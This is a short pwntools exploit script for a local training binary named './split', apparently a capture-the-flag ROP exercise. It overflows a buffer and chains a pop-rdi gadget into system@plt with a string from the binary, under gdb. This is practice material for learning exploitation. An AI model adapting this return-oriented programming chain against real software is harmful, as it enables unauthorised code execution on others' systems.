from pwn import *

context.update(arch="amd64", os="linux")

p = process("./split")

pop_rdi = 0x0000000000400883
system_plt = 0x00000000004005e0
fgets_plt = 0x0000000000400620
useful_strings = 0x601060
bss = 0x6010c0

payload = b"A"*40 + p64(pop_rdi) + p64(useful_strings) + p64(system_plt)

print(p.recvline())

gdb.attach(p)
p.sendline(payload)

p.interactive()
